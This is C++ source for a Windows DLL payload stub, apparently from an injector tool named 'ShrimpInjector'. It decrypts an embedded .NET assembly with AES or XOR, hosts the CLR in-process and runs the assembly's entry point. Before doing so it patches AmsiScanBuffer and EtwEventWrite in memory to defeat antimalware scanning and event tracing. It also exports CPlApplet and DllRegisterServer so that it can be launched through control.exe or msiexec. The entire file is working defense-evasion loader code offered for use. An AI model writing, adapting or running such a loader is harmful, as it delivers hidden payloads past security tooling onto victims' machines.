// Native DLL stub — CLR host that decrypts and loads a .NET assembly
// Exports: DllMain, CPlApplet (control.exe), DllRegisterServer (msiexec /y)
//
// Cross-compile from macOS/Linux:
//   x86_64-w64-mingw32-g++ -shared -o payload.dll native_dll_payload.cpp \
//     -loleaut32 -lole32 -static-libgcc -static-libstdc++

#define WIN32_LEAN_AND_MEAN
#define COBJMACROS
#include <initguid.h>
#include <windows.h>
#include <objbase.h>
#include <oaidl.h>
#include <oleauto.h>
#include <stdio.h>
#include <string.h>

#ifndef GUID_NULL
static const GUID __guid_null = {0,0,0,{0,0,0,0,0,0,0,0}};
#define GUID_NULL __guid_null
#endif

#ifndef _HDOMAINENUM_DEFINED
typedef void* HDOMAINENUM;
#define _HDOMAINENUM_DEFINED
#endif

// === Payload data (patched by ShrimpInjector) ===
static const char ENCRYPTED_B64[] = "YOURPAYLOADHERE";
static const char KEY_B64[] = "YOURKEYHERE";
// DECRYPT_AES_IV
static const char IV_B64[] = "YOURIVHERE";
// DECRYPT_AES_IV_END

// === COM GUIDs ===
static const GUID CLSID_CLRMetaHost =
    {0x9280188d, 0x0e8e, 0x4867, {0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
static const GUID IID_ICLRMetaHost =
    {0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
static const GUID IID_ICLRRuntimeInfo =
    {0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};
static const GUID CLSID_CorRuntimeHost =
    {0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};
static const GUID IID_ICorRuntimeHost =
    {0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

// === COM interface declarations (inline vtables for MinGW) ===
#undef INTERFACE
#define INTERFACE ICLRMetaHost
DECLARE_INTERFACE_(ICLRMetaHost, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppv) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(GetRuntime)(THIS_ LPCWSTR pwzVersion, REFIID riid, LPVOID* ppRuntime) PURE;
    STDMETHOD(GetVersionFromFile)(THIS_ LPCWSTR pwzFilePath, LPWSTR pwzBuffer, DWORD* pcchBuffer) PURE;
    STDMETHOD(EnumerateInstalledRuntimes)(THIS_ void** ppEnumerator) PURE;
    STDMETHOD(EnumerateLoadedRuntimes)(THIS_ HANDLE hndProcess, void** ppEnumerator) PURE;
    STDMETHOD(RequestRuntimeLoadedNotification)(THIS_ void* pCallbackFunction) PURE;
    STDMETHOD(QueryLegacyV2RuntimeBinding)(THIS_ REFIID riid, LPVOID* ppUnk) PURE;
    STDMETHOD(ExitProcess)(THIS_ INT32 iExitCode) PURE;
};
#undef INTERFACE

#define INTERFACE ICLRRuntimeInfo
DECLARE_INTERFACE_(ICLRRuntimeInfo, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppv) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(GetVersionString)(THIS_ LPWSTR pwzBuffer, DWORD* pcchBuffer) PURE;
    STDMETHOD(GetRuntimeDirectory)(THIS_ LPWSTR pwzBuffer, DWORD* pcchBuffer) PURE;
    STDMETHOD(IsLoaded)(THIS_ HANDLE hndProcess, BOOL* pbLoaded) PURE;
    STDMETHOD(LoadErrorString)(THIS_ UINT iResourceID, LPWSTR pwzBuffer, DWORD* pcchBuffer, LONG iLocaleID) PURE;
    STDMETHOD(LoadLibrary)(THIS_ LPCWSTR pwzDllName, HMODULE* phndModule) PURE;
    STDMETHOD(GetProcAddress)(THIS_ LPCSTR pszProcName, LPVOID* ppProc) PURE;
    STDMETHOD(GetInterface)(THIS_ REFCLSID rclsid, REFIID riid, LPVOID* ppUnk) PURE;
    STDMETHOD(IsLoadable)(THIS_ BOOL* pbLoadable) PURE;
    STDMETHOD(SetDefaultStartupFlags)(THIS_ DWORD dwStartupFlags, LPCWSTR pwzHostConfigFile) PURE;
    STDMETHOD(GetDefaultStartupFlags)(THIS_ DWORD* pdwStartupFlags, LPWSTR pwzHostConfigFile, DWORD* pcchHostConfigFile) PURE;
    STDMETHOD(BindAsLegacyV2Runtime)(THIS) PURE;
    STDMETHOD(IsStarted)(THIS_ BOOL* pbStarted, DWORD* pdwStartupFlags) PURE;
};
#undef INTERFACE

#define INTERFACE ICorRuntimeHost
DECLARE_INTERFACE_(ICorRuntimeHost, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppv) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(CreateLogicalThreadState)(THIS) PURE;
    STDMETHOD(DeleteLogicalThreadState)(THIS) PURE;
    STDMETHOD(SwitchInLogicalThreadState)(THIS_ DWORD* pFiberCookie) PURE;
    STDMETHOD(SwitchOutLogicalThreadState)(THIS_ DWORD** pFiberCookie) PURE;
    STDMETHOD(LocksHeldByLogicalThread)(THIS_ DWORD* pCount) PURE;
    STDMETHOD(MapFile)(THIS_ HANDLE hFile, HMODULE* hMapAddress) PURE;
    STDMETHOD(GetConfiguration)(THIS_ void** pConfiguration) PURE;
    STDMETHOD(Start)(THIS) PURE;
    STDMETHOD(Stop)(THIS) PURE;
    STDMETHOD(CreateDomain)(THIS_ LPCWSTR pwzFriendlyName, IUnknown* pIdentityArray, IUnknown** pAppDomain) PURE;
    STDMETHOD(GetDefaultDomain)(THIS_ IUnknown** pAppDomain) PURE;
    STDMETHOD(EnumDomains)(THIS_ HDOMAINENUM* hEnum) PURE;
    STDMETHOD(NextDomain)(THIS_ HDOMAINENUM hEnum, IUnknown** pAppDomain) PURE;
    STDMETHOD(CloseEnum)(THIS_ HDOMAINENUM hEnum) PURE;
    STDMETHOD(CreateDomainEx)(THIS_ LPCWSTR pwzFriendlyName, IUnknown* pSetup, IUnknown* pEvidence, IUnknown** pAppDomain) PURE;
    STDMETHOD(CreateDomainSetup)(THIS_ IUnknown** pAppDomainSetup) PURE;
    STDMETHOD(CreateEvidence)(THIS_ IUnknown** pEvidence) PURE;
    STDMETHOD(UnloadDomain)(THIS_ IUnknown* pAppDomain) PURE;
    STDMETHOD(CurrentDomain)(THIS_ IUnknown** pAppDomain) PURE;
};
#undef INTERFACE

typedef HRESULT (WINAPI *pfnCLRCreateInstance)(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);

// === Base64 decode ===
static int b64val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static unsigned char* b64decode(const char* src, unsigned int* outLen) {
    unsigned int slen = (unsigned int)strlen(src);
    unsigned int pad = 0;
    if (slen > 0 && src[slen-1] == '=') pad++;
    if (slen > 1 && src[slen-2] == '=') pad++;
    unsigned int dlen = (slen / 4) * 3 - pad;
    unsigned char* out = (unsigned char*)VirtualAlloc(NULL, dlen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!out) return NULL;
    unsigned int i, j = 0;
    for (i = 0; i < slen; i += 4) {
        int a = b64val(src[i]), b = b64val(src[i+1]);
        int c = (i+2 < slen && src[i+2] != '=') ? b64val(src[i+2]) : 0;
        int d = (i+3 < slen && src[i+3] != '=') ? b64val(src[i+3]) : 0;
        unsigned int triple = (a << 18) | (b << 12) | (c << 6) | d;
        if (j < dlen) out[j++] = (triple >> 16) & 0xFF;
        if (j < dlen) out[j++] = (triple >> 8) & 0xFF;
        if (j < dlen) out[j++] = triple & 0xFF;
    }
    *outLen = dlen;
    return out;
}

// === XOR decrypt in-place ===
static void xor_decrypt(unsigned char* data, unsigned int len,
                        const unsigned char* key, unsigned int keyLen) {
    for (unsigned int i = 0; i < len; i++)
        data[i] ^= key[i % keyLen];
}

// === IDispatch helper ===
static HRESULT DispatchCall(IDispatch* pDisp, LPCOLESTR name, WORD flags,
                            DISPPARAMS* pParams, VARIANT* pResult) {
    DISPID dispid;
    OLECHAR* names[] = { (OLECHAR*)name };
    HRESULT hr = pDisp->GetIDsOfNames(IID_NULL, names, 1, LOCALE_SYSTEM_DEFAULT, &dispid);
    if (FAILED(hr)) return hr;
    return pDisp->Invoke(dispid, IID_NULL, LOCALE_SYSTEM_DEFAULT, flags, pParams, pResult, NULL, NULL);
}

// === AMSI + ETW patches ===
static void PatchEtw(void) {
    HMODULE h = GetModuleHandleW(L"ntdll.dll");
    if (!h) return;
    void* addr = (void*)GetProcAddress(h, "EtwEventWrite");
    if (!addr) return;
    unsigned char p[] = { 0x33, 0xC0, 0xC3 };
    DWORD old; VirtualProtect(addr, sizeof(p), PAGE_EXECUTE_READWRITE, &old);
    memcpy(addr, p, sizeof(p));
    DWORD tmp; VirtualProtect(addr, sizeof(p), old, &tmp);
}

static void PatchAmsi(void) {
    HMODULE h = LoadLibraryW(L"amsi.dll");
    if (!h) return;
    void* addr = (void*)GetProcAddress(h, "AmsiScanBuffer");
    if (!addr) return;
    unsigned char p[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old; VirtualProtect(addr, sizeof(p), PAGE_EXECUTE_READWRITE, &old);
    memcpy(addr, p, sizeof(p));
    DWORD tmp; VirtualProtect(addr, sizeof(p), old, &tmp);
}

// === Core: decrypt, host CLR, load and invoke assembly ===
static void Execute(void) {
    unsigned int encLen = 0, keyLen = 0;
    unsigned char* enc = b64decode(ENCRYPTED_B64, &encLen);
    unsigned char* key = b64decode(KEY_B64, &keyLen);
    if (!enc || !key) return;

    HMODULE hMscoree = NULL;
    pfnCLRCreateInstance fnCreate = NULL;
    ICLRMetaHost* pMeta = NULL;
    ICLRRuntimeInfo* pInfo = NULL;
    ICorRuntimeHost* pHost = NULL;
    IUnknown* pThunk = NULL;
    IDispatch* pDomain = NULL;

    // DECRYPT_XOR_START
    // xor_decrypt(enc, encLen, key, keyLen);
    // unsigned char* clearBytes = enc;
    // unsigned int clearLen = encLen;
    // DECRYPT_XOR_END

    // DECRYPT_AES_START
    unsigned int ivLen = 0;
    unsigned char* iv = b64decode(IV_B64, &ivLen);
    if (!iv) return;

    hMscoree = LoadLibraryW(L"mscoree.dll");
    if (!hMscoree) return;
    fnCreate = (pfnCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!fnCreate) return;

    if (FAILED(fnCreate(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMeta))) return;
    if (FAILED(pMeta->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&pInfo))) return;
    if (FAILED(pInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pHost))) return;

    PatchEtw();
    pHost->Start();
    PatchAmsi();

    if (FAILED(pHost->GetDefaultDomain(&pThunk))) goto done;
    if (FAILED(pThunk->QueryInterface(IID_IDispatch, (void**)&pDomain))) goto done;

    // AES decrypt via .NET RijndaelManaged through COM interop
    {
        DISPPARAMS noP = {NULL, NULL, 0, 0};

        // Create RijndaelManaged
        VARIANT vtTypeName; VariantInit(&vtTypeName);
        vtTypeName.vt = VT_BSTR;
        vtTypeName.bstrVal = SysAllocString(L"System.Security.Cryptography.RijndaelManaged");
        DISPPARAMS createP = { &vtTypeName, NULL, 1, 0 };
        VARIANT vtAesObj; VariantInit(&vtAesObj);
        DispatchCall(pDomain, L"CreateInstanceAndUnwrap", DISPATCH_METHOD, &createP, &vtAesObj);
        SysFreeString(vtTypeName.bstrVal);
        if (!vtAesObj.pdispVal) goto done;
        IDispatch* pAes = vtAesObj.pdispVal;

        // Set Mode=CBC(1), Padding=PKCS7(2)
        VARIANT vtMode; VariantInit(&vtMode); vtMode.vt = VT_I4; vtMode.lVal = 1;
        DISPID putId; OLECHAR* modeName[] = {(OLECHAR*)L"Mode"};
        pAes->GetIDsOfNames(IID_NULL, modeName, 1, LOCALE_SYSTEM_DEFAULT, &putId);
        DISPID namedPut = DISPID_PROPERTYPUT;
        DISPPARAMS putP = { &vtMode, &namedPut, 1, 1 };
        pAes->Invoke(putId, IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYPUT, &putP, NULL, NULL, NULL);

        VARIANT vtPad; VariantInit(&vtPad); vtPad.vt = VT_I4; vtPad.lVal = 2;
        OLECHAR* padName[] = {(OLECHAR*)L"Padding"};
        pAes->GetIDsOfNames(IID_NULL, padName, 1, LOCALE_SYSTEM_DEFAULT, &putId);
        putP.rgvarg = &vtPad;
        pAes->Invoke(putId, IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYPUT, &putP, NULL, NULL, NULL);

        // Set Key
        SAFEARRAYBOUND kb = { keyLen, 0 };
        SAFEARRAY* psaKey = SafeArrayCreate(VT_UI1, 1, &kb);
        void* kd; SafeArrayAccessData(psaKey, &kd); memcpy(kd, key, keyLen); SafeArrayUnaccessData(psaKey);
        VARIANT vtKey; VariantInit(&vtKey); vtKey.vt = VT_ARRAY|VT_UI1; vtKey.parray = psaKey;
        OLECHAR* keyName[] = {(OLECHAR*)L"Key"};
        pAes->GetIDsOfNames(IID_NULL, keyName, 1, LOCALE_SYSTEM_DEFAULT, &putId);
        putP.rgvarg = &vtKey;
        pAes->Invoke(putId, IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYPUT, &putP, NULL, NULL, NULL);

        // Set IV
        SAFEARRAYBOUND ib = { ivLen, 0 };
        SAFEARRAY* psaIv = SafeArrayCreate(VT_UI1, 1, &ib);
        void* id; SafeArrayAccessData(psaIv, &id); memcpy(id, iv, ivLen); SafeArrayUnaccessData(psaIv);
        VARIANT vtIv; VariantInit(&vtIv); vtIv.vt = VT_ARRAY|VT_UI1; vtIv.parray = psaIv;
        OLECHAR* ivName[] = {(OLECHAR*)L"IV"};
        pAes->GetIDsOfNames(IID_NULL, ivName, 1, LOCALE_SYSTEM_DEFAULT, &putId);
        putP.rgvarg = &vtIv;
        pAes->Invoke(putId, IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYPUT, &putP, NULL, NULL, NULL);

        // CreateDecryptor()
        VARIANT vtDecryptor; VariantInit(&vtDecryptor);
        DispatchCall(pAes, L"CreateDecryptor", DISPATCH_METHOD, &noP, &vtDecryptor);
        if (!vtDecryptor.pdispVal) goto done;
        IDispatch* pDecryptor = vtDecryptor.pdispVal;

        // TransformFinalBlock(enc, 0, encLen)
        SAFEARRAYBOUND eb = { encLen, 0 };
        SAFEARRAY* psaEnc = SafeArrayCreate(VT_UI1, 1, &eb);
        void* ed; SafeArrayAccessData(psaEnc, &ed); memcpy(ed, enc, encLen); SafeArrayUnaccessData(psaEnc);

        VARIANT tfbArgs[3];
        VariantInit(&tfbArgs[0]); tfbArgs[0].vt = VT_I4; tfbArgs[0].lVal = (LONG)encLen;
        VariantInit(&tfbArgs[1]); tfbArgs[1].vt = VT_I4; tfbArgs[1].lVal = 0;
        VariantInit(&tfbArgs[2]); tfbArgs[2].vt = VT_ARRAY|VT_UI1; tfbArgs[2].parray = psaEnc;
        DISPPARAMS tfbP = { tfbArgs, NULL, 3, 0 };
        VARIANT vtClear; VariantInit(&vtClear);
        DispatchCall(pDecryptor, L"TransformFinalBlock", DISPATCH_METHOD, &tfbP, &vtClear);

        SafeArrayDestroy(psaEnc);
        pDecryptor->Release();
        pAes->Release();

        if (!(vtClear.vt & VT_ARRAY)) goto done;

        // Load decrypted assembly
        VARIANT vtLoadArg; VariantInit(&vtLoadArg);
        vtLoadArg.vt = VT_ARRAY | VT_UI1;
        vtLoadArg.parray = vtClear.parray;
        DISPPARAMS loadP = { &vtLoadArg, NULL, 1, 0 };
        VARIANT vtAsm; VariantInit(&vtAsm);
        DispatchCall(pDomain, L"Load", DISPATCH_METHOD, &loadP, &vtAsm);

        SafeArrayDestroy(psaKey);
        SafeArrayDestroy(psaIv);
        VirtualFree(iv, 0, MEM_RELEASE);

        if (!vtAsm.pdispVal) goto done;
        IDispatch* pAsm = vtAsm.pdispVal;

        // Get EntryPoint and invoke
        VARIANT vtEntry; VariantInit(&vtEntry);
        DispatchCall(pAsm, L"EntryPoint", DISPATCH_PROPERTYGET, &noP, &vtEntry);
        if (vtEntry.pdispVal) {
            // YOURARGS_START
            SAFEARRAYBOUND ab = { 0, 0 };
            // YOURARGS_END
            SAFEARRAY* psaArgs = SafeArrayCreate(VT_BSTR, 1, &ab);
            // YOURARGS_PUT

            VARIANT vtStrArgs; VariantInit(&vtStrArgs);
            vtStrArgs.vt = VT_ARRAY | VT_BSTR;
            vtStrArgs.parray = psaArgs;

            SAFEARRAYBOUND pb = { 1, 0 };
            SAFEARRAY* psaOuter = SafeArrayCreate(VT_VARIANT, 1, &pb);
            long idx = 0;
            SafeArrayPutElement(psaOuter, &idx, &vtStrArgs);

            VARIANT invokeArgs[2];
            VariantInit(&invokeArgs[0]);
            invokeArgs[0].vt = VT_ARRAY | VT_VARIANT;
            invokeArgs[0].parray = psaOuter;
            VariantInit(&invokeArgs[1]);
            DISPPARAMS invokeP = { invokeArgs, NULL, 2, 0 };
            VARIANT vtResult; VariantInit(&vtResult);
            DispatchCall(vtEntry.pdispVal, L"Invoke", DISPATCH_METHOD, &invokeP, &vtResult);

            SafeArrayDestroy(psaOuter);
            SafeArrayDestroy(psaArgs);
            vtEntry.pdispVal->Release();
        }
        pAsm->Release();
        VariantClear(&vtClear);
    }
    // DECRYPT_AES_END

    // DECRYPT_XOR_LOAD_START
    // hMscoree = LoadLibraryW(L"mscoree.dll");
    // if (!hMscoree) goto done;
    // fnCreate = (pfnCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");
    // if (!fnCreate) goto done;
    //
    // if (FAILED(fnCreate(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMeta))) goto done;
    // if (FAILED(pMeta->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&pInfo))) goto done;
    // if (FAILED(pInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pHost))) goto done;
    //
    // PatchEtw();
    // pHost->Start();
    // PatchAmsi();
    //
    // if (FAILED(pHost->GetDefaultDomain(&pThunk))) goto done;
    // if (FAILED(pThunk->QueryInterface(IID_IDispatch, (void**)&pDomain))) goto done;
    //
    // {
    //     DISPPARAMS noP = {NULL, NULL, 0, 0};
    //     SAFEARRAYBOUND sb = { clearLen, 0 };
    //     SAFEARRAY* psa = SafeArrayCreate(VT_UI1, 1, &sb);
    //     void* pd; SafeArrayAccessData(psa, &pd); memcpy(pd, clearBytes, clearLen); SafeArrayUnaccessData(psa);
    //     VARIANT vtLoadArg; VariantInit(&vtLoadArg);
    //     vtLoadArg.vt = VT_ARRAY | VT_UI1; vtLoadArg.parray = psa;
    //     DISPPARAMS loadP = { &vtLoadArg, NULL, 1, 0 };
    //     VARIANT vtAsm; VariantInit(&vtAsm);
    //     DispatchCall(pDomain, L"Load", DISPATCH_METHOD, &loadP, &vtAsm);
    //     SafeArrayDestroy(psa);
    //     if (!vtAsm.pdispVal) goto done;
    //     IDispatch* pAsm = vtAsm.pdispVal;
    //     VARIANT vtEntry; VariantInit(&vtEntry);
    //     DispatchCall(pAsm, L"EntryPoint", DISPATCH_PROPERTYGET, &noP, &vtEntry);
    //     if (vtEntry.pdispVal) {
    //         // YOURARGS_XOR_START
    //         SAFEARRAYBOUND ab = { 0, 0 };
    //         // YOURARGS_XOR_END
    //         SAFEARRAY* psaArgs = SafeArrayCreate(VT_BSTR, 1, &ab);
    //         // YOURARGS_XOR_PUT
    //         VARIANT vtStrArgs; VariantInit(&vtStrArgs);
    //         vtStrArgs.vt = VT_ARRAY | VT_BSTR; vtStrArgs.parray = psaArgs;
    //         SAFEARRAYBOUND pb = { 1, 0 };
    //         SAFEARRAY* psaOuter = SafeArrayCreate(VT_VARIANT, 1, &pb);
    //         long idx = 0;
    //         SafeArrayPutElement(psaOuter, &idx, &vtStrArgs);
    //         VARIANT invokeArgs[2];
    //         VariantInit(&invokeArgs[0]);
    //         invokeArgs[0].vt = VT_ARRAY | VT_VARIANT; invokeArgs[0].parray = psaOuter;
    //         VariantInit(&invokeArgs[1]);
    //         DISPPARAMS invokeP = { invokeArgs, NULL, 2, 0 };
    //         VARIANT vtResult; VariantInit(&vtResult);
    //         DispatchCall(vtEntry.pdispVal, L"Invoke", DISPATCH_METHOD, &invokeP, &vtResult);
    //         SafeArrayDestroy(psaOuter); SafeArrayDestroy(psaArgs);
    //         vtEntry.pdispVal->Release();
    //     }
    //     pAsm->Release();
    // }
    // DECRYPT_XOR_LOAD_END

done:
    SecureZeroMemory(enc, encLen);
    VirtualFree(enc, 0, MEM_RELEASE);
    SecureZeroMemory(key, keyLen);
    VirtualFree(key, 0, MEM_RELEASE);

    if (pDomain) pDomain->Release();
    if (pThunk) pThunk->Release();
    if (pHost) { pHost->Stop(); pHost->Release(); }
    if (pInfo) pInfo->Release();
    if (pMeta) pMeta->Release();
    CoUninitialize();
}

// === DLL exports ===

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        // DLLMAIN_EXECUTE_START
        // CoInitializeEx(NULL, COINIT_MULTITHREADED);
        // Execute();
        // DLLMAIN_EXECUTE_END
    }
    return TRUE;
}

// control.exe — CPlApplet export
__declspec(dllexport) LONG CALLBACK CPlApplet(HWND hwnd, UINT msg,
                                               LPARAM lp1, LPARAM lp2) {
    if (msg == 1) { // CPL_INIT
        CoInitializeEx(NULL, COINIT_MULTITHREADED);
        Execute();
    }
    return 0;
}

// msiexec /y — DllRegisterServer export
__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    Execute();
    return S_OK;
}
